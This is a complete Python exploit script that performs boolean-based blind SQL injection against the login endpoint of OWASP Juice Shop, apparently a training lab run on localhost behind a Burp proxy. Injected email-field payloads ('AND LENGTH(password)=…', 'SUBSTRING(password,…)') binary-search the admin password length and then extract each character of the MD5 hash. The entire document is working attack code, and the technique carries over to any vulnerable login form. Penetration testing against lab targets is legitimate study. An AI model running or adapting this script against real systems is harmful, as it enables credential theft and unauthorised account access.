#!/usr/bin/env python3
import requests

# Disable urllib3 warnings for insecure HTTPS requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to check if the password length matches testLength
def is_length(targetUrl, session, proxies, testLength):
    # SQL injection payload to check password length
    sql_payload = {
        "email": f"admin@juice-sh.op' AND LENGTH(password)={testLength}-- ",
        "password": "password"
    }

    try:
        # Send POST request with payload
        response = session.post(targetUrl, json=sql_payload, verify=False, proxies=proxies)
        jsonResponse = response.json()
    except Exception:
        # If request fails, return empty dict
        jsonResponse = {}

    # If 'authentication' is in response, length matches
    return 'authentication' in jsonResponse

# Function to guess the character at a specific position in the password
def guess_char(targetUrl, session, proxies, position, charset):
    low = 0
    high = len(charset) - 1
    # Binary search over possible characters
    while low <= high:
        mid = (low + high) // 2
        char = charset[mid]

        # SQL injection payload to check if character matches
        sql_payload = {
            "email": f"admin@juice-sh.op' AND SUBSTRING(password,{position},1)='{char}'-- ",
            "password": "password"
        }
        
        try:
            response = session.post(targetUrl, json=sql_payload, verify=False, proxies=proxies)
            jsonResponse = response.json()
        except Exception:
            jsonResponse = {}

        # If match found, return character
        if 'authentication' in jsonResponse:
            return char
        else:
            # SQL injection payload to check if character is greater than current guess
            sql_payload = {
                "email": f"admin@juice-sh.op' AND SUBSTRING(password,{position},1)>'{char}'-- ",
                "password": "password"
            }
        
            try:
                response = session.post(targetUrl, json=sql_payload, verify=False, proxies=proxies)
                jsonResponse = response.json()
            except Exception:
                jsonResponse = {}

            # Adjust search range based on response
            if 'authentication' in jsonResponse:
                low = mid + 1
            else:
                high = mid - 1
    # If character not found, return None
    return None

if __name__ == "__main__":
    # Target URL for login endpoint
    targetUrl = 'http://localhost:3000/rest/user/login'
    # Proxy settings for debugging (e.g., Burp Suite)
    proxies = {
        'http': 'http://localhost:8080',
        'https': 'http://localhost:8080',
    }

    # Create a session for persistent headers
    session = requests.Session()
    session.headers.update({'Content-Type': 'application/json'})
    session.headers.update({'Accept': 'application/json, text/plain, */*'})

    # Initial range for password length guessing
    low = 1
    high = 64
    found_length = None

    # Binary search to find password length
    while low <= high:
        mid = (low + high) // 2

        if is_length(targetUrl, session, proxies, mid):
            found_length = mid
            break
        else:
            # SQL injection payload to check if password length is greater than mid
            sql_payload = {
                "email": f"admin@juice-sh.op' AND LENGTH(password)>{mid}-- ",
                "password": "password"
            }

            try:
                response = session.post(targetUrl, json=sql_payload, verify=False, proxies=proxies)
                jsonResponse = response.json()
            except Exception:
                jsonResponse = {}

            # Adjust search range based on response
            if 'authentication' in jsonResponse:
                low = mid + 1
            else:
                high = mid - 1

    # If password length found, start guessing each character
    if found_length:
        print(f"Password length = {found_length}")
        
        charset = '0123456789abcdef'  # MD5 charset (hexadecimal)
        password = ''
        
        # Loop through each position in the password
        for pos in range(1, found_length + 1):
            ch = guess_char(targetUrl, session, proxies, pos, charset)

            if ch: # Found character
                password += ch
                print(f"Position {pos}: {ch} -> {password}")
            else:
                print(f"Failed to guess character at position {pos}")
                break
        print(f"Guessed password hash: {password}")
    else:
        print("Password length not found in checked range.")


